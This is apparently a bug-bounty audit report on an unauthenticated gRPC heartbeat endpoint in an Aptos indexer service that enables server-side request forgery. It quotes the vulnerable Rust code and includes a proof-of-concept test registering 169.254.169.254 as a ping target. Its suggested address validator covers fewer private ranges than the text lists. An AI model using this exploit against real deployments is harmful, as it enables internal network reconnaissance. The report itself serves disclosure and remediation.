# Audit Report

## Title
Unauthenticated gRPC Heartbeat Endpoint Enables SSRF Through Dynamic Service Registration

## Summary
The indexer-grpc-manager service exposes an unauthenticated gRPC `heartbeat()` endpoint that accepts service registration requests containing arbitrary addresses. When a heartbeat is received, the service dynamically creates gRPC clients to the provided addresses and periodically pings them, enabling Server-Side Request Forgery (SSRF) attacks against internal infrastructure.

## Finding Description
The vulnerability exists in the `GrpcManagerService::heartbeat()` RPC handler, which processes incoming heartbeat requests without authentication. The attack flow is:

1. The grpc-manager service starts with an unauthenticated gRPC endpoint [1](#0-0) 

2. The `heartbeat()` RPC handler extracts addresses from incoming requests without validation or authentication [2](#0-1) 

3. The `handle_heartbeat()` method routes these addresses to type-specific handlers [3](#0-2) 

4. Each handler (e.g., `handle_live_data_service_info()`) dynamically registers the attacker-controlled address using `.or_insert()`, which creates new gRPC clients [4](#0-3) 

5. The client creation functions (e.g., `LiveDataService::new()`) use `Channel::from_shared(address)` without validating the address format or restricting internal IPs [5](#0-4) 

6. The metadata manager's main loop periodically pings all registered services, causing outbound connections to attacker-controlled targets [6](#0-5) 

An attacker can craft a gRPC `HeartbeatRequest` with malicious addresses (e.g., `http://169.254.169.254`, `http://localhost:6379`, or any internal service URL) and send it to the grpc-manager. The service will then make periodic outbound connections to these addresses.

## Impact Explanation
This vulnerability qualifies as **High Severity** per the Aptos bug bounty program criteria:

- **API crashes**: Malicious addresses can cause the service to consume resources attempting to connect to unreachable or malicious endpoints
- **Significant protocol violations**: Breaks the security boundary between internal and external networks
- **Information disclosure**: Enables port scanning, internal network enumeration, and potential access to cloud metadata services (AWS/GCP instance metadata at 169.254.169.254)
- **Infrastructure reconnaissance**: Attackers can map internal services by observing connection timing and error messages

While the gRPC protocol mismatch may prevent direct exploitation of HTTP-based metadata services, the TCP connection attempts themselves leak information about internal network topology and can be used for further attacks.

## Likelihood Explanation
Likelihood is **HIGH** because:

1. **No authentication required**: Any network actor who can reach the gRPC endpoint can exploit this
2. **Simple exploitation**: Requires only a single crafted gRPC request
3. **No privileges needed**: Does not require validator access or special permissions
4. **Intended network exposure**: The indexer-grpc infrastructure is designed to be accessible to external data service operators, making the endpoint reachable by potential attackers
5. **Automatic triggering**: Once the malicious address is registered, the service automatically begins pinging it within seconds

## Recommendation
Implement the following security controls:

1. **Add authentication to the heartbeat endpoint**: Use mutual TLS or token-based authentication to verify service identity [7](#0-6) 

2. **Validate registered addresses**: Before creating gRPC clients, validate that addresses:
   - Use allowed schemes (e.g., only `https://`)
   - Do not target internal IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16)
   - Match an allowlist of expected service domains

3. **Use static configuration**: Consider restricting dynamic registration entirely, relying only on the static `grpc_manager_addresses` configuration [8](#0-7) 

4. **Add rate limiting**: Prevent abuse by limiting heartbeat registration requests per source IP

Example validation code:
```rust
fn validate_address(address: &str) -> Result<()> {
    let uri = address.parse::<Uri>()?;
    let host = uri.host().ok_or(anyhow!("No host in URI"))?;
    
    // Block localhost and internal IPs
    if host == "localhost" || host.starts_with("127.") || 
       host.starts_with("169.254.") || host.starts_with("10.") {
        bail!("Internal addresses not allowed");
    }
    
    // Require HTTPS for external services
    if uri.scheme_str() != Some("https") {
        bail!("Only HTTPS allowed");
    }
    
    Ok(())
}
```

## Proof of Concept
```rust
// PoC demonstrating the SSRF vulnerability
use aptos_protos::indexer::v1::{
    HeartbeatRequest, ServiceInfo, LiveDataServiceInfo,
    service_info::Info,
    grpc_manager_client::GrpcManagerClient,
};
use tonic::Request;

#[tokio::test]
async fn test_ssrf_via_heartbeat() {
    // Start a grpc-manager instance (as per test.rs)
    let config = IndexerGrpcManagerConfig {
        // ... standard config ...
    };
    tokio::spawn(async move { config.run().await });
    
    // Wait for service to start
    tokio::time::sleep(Duration::from_secs(2)).await;
    
    // Connect as attacker
    let mut client = GrpcManagerClient::connect("http://127.0.0.1:50051")
        .await
        .unwrap();
    
    // Send malicious heartbeat with internal address
    let malicious_address = "http://169.254.169.254:80".to_string();
    
    let request = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some(malicious_address.clone()),
            info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                chain_id: 0,
                timestamp: Some(timestamp_now_proto()),
                min_servable_version: Some(0),
                stream_info: None,
            })),
        }),
    };
    
    // Send the malicious heartbeat - this succeeds without authentication
    let response = client.heartbeat(Request::new(request)).await;
    assert!(response.is_ok());
    
    // The grpc-manager now has the malicious address registered
    // and will start pinging it within seconds
    tokio::time::sleep(Duration::from_secs(10)).await;
    
    // Monitor network connections - you'll see outbound connections
    // to 169.254.169.254 being attempted by the grpc-manager
}
```

## Notes
The original security question focused on the static `grpc_manager_addresses` configuration field at line 38. However, the investigation revealed a more severe vulnerability: the **dynamic registration** via unauthenticated heartbeat RPC is the actual attack vector. The static configuration is operator-controlled and not a security issue, but the lack of authentication on the heartbeat endpoint allows any network attacker to inject arbitrary addresses at runtime.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L91-104)
```rust
    pub(crate) fn start(&self, service_config: &ServiceConfig) -> Result<()> {
        let service = GrpcManagerServer::new(GrpcManagerService::new(
            self.chain_id,
            self.metadata_manager.clone(),
            self.data_manager.clone(),
        ))
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L88-102)
```rust
impl LiveDataService {
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .connect_lazy();
        let client = DataServiceClient::new(channel)
            .send_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Zstd)
            .max_encoding_message_size(MAX_MESSAGE_SIZE)
            .max_decoding_message_size(MAX_MESSAGE_SIZE);
        Self {
            client,
            recent_states: VecDeque::new(),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L217-248)
```rust
                for kv in &self.live_data_services {
                    let (address, live_data_service) = kv.pair();
                    let unreachable = live_data_service.recent_states.back().is_some_and(|s| {
                        Self::is_stale_timestamp(
                            s.timestamp.unwrap_or_default(),
                            Duration::from_secs(60),
                        )
                    });
                    if unreachable {
                        unreachable_live_data_services.push(address.clone());
                        continue;
                    }
                    let need_ping = live_data_service.recent_states.back().is_none_or(|s| {
                        Self::is_stale_timestamp(
                            s.timestamp.unwrap_or_default(),
                            Duration::from_secs(5),
                        )
                    });
                    if need_ping {
                        let address = address.clone();
                        let client = live_data_service.client.clone();
                        s.spawn(async move {
                            if let Err(e) =
                                self.ping_live_data_service(address.clone(), client).await
                            {
                                warn!("Failed to ping live data service ({address}): {e:?}.");
                            } else {
                                trace!("Successfully pinged live data service ({address}).");
                            }
                        });
                    }
                }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L330-339)
```rust
    pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
        match info {
            Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
            Info::HistoricalDataServiceInfo(info) => {
                self.handle_historical_data_service_info(address, info)
            },
            Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
            Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L38-38)
```rust
    pub(crate) grpc_manager_addresses: Vec<GrpcAddress>,
```
